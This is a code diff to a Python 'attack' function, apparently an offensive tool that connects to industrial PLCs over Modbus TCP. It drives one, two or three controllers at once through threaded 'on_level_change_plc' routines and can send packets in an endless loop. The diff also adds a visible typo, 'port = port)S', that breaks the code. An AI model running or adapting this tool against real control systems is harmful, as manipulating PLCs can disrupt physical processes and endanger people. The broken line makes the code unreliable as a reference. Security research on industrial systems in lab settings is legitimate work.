@@ -14,6 +14,8 @@ def attack(ctx):
         pckt_number = config.get('params', 'packets_number')
         pckt_value = int(config.get('params', 'packets_value'))
 
+        print(address)
+
         if(pckt_number == "loop"): 
             while(True):
                 case = 0
@@ -100,7 +102,7 @@ def attack(ctx):
         # Convert the port to an integer
         port = int(port)
 
-        client = ModbusTcpClient(ip, port = port)
+        client = ModbusTcpClient(ip, port = port)S
         client.connect()
         
         for choice in choices_list:
@@ -241,7 +243,7 @@ def attack(ctx):
         
 
     # TWO PLCs selected
-    if config.get('params', 'plc1_choice') != "" and config.get('params', 'plc2_choice') != "":
+    if config.get('params', 'plc1_choice') != "" and config.get('params', 'plc2_choice') != "" and config.get('params', 'plc3_choice') == "":
         print("Attacking two PLCs...")
         thread1 = threading.Thread(target=on_level_change_plc, args=(values[0], config.get('plc', 'plc1')))
         thread2 = threading.Thread(target=on_level_change_plc, args=(values[1], config.get('plc', 'plc2')))
@@ -251,15 +253,16 @@ def attack(ctx):
         thread2.join()
     
     # THREE PLCs selected 
-        if config.get('plc', 'plc1') != "" and config.get('params', 'plc2_choice') != "" and config.get('params', 'plc3_choice') != "":
-            print("Attacking three plcs...")
-            thread1 = threading.Thread(target=on_level_change_plc, args=(values[0], config.get('plc', 'plc1')))
-            thread2 = threading.Thread(target=on_level_change_plc, args=(values[1], config.get('plc', 'plc2')))
-            thread3 = threading.Thread(target=on_level_change_plc, args=(values[2], config.get('plc', 'plc3')))
-            thread1.start()
-            thread2.start()
-            thread3.start()
-            thread1.join()
-            thread2.join()
-            thread3.join()
+    if config.get('params', 'plc1_choice') != "" and config.get('params', 'plc2_choice') != "" and config.get('params', 'plc3_choice') != "":
+        print("Attacking three plcs...")
+        thread1 = threading.Thread(target=on_level_change_plc, args=(values[0], config.get('plc', 'plc1')))
+        thread2 = threading.Thread(target=on_level_change_plc, args=(values[1], config.get('plc', 'plc2')))
+        thread3 = threading.Thread(target=on_level_change_plc, args=(values[2], config.get('plc', 'plc3')))
+        thread1.start()
+        thread2.start()
+        thread3.start()
+        thread1.join()
+        thread2.join()
+        thread3.join()
 
+    
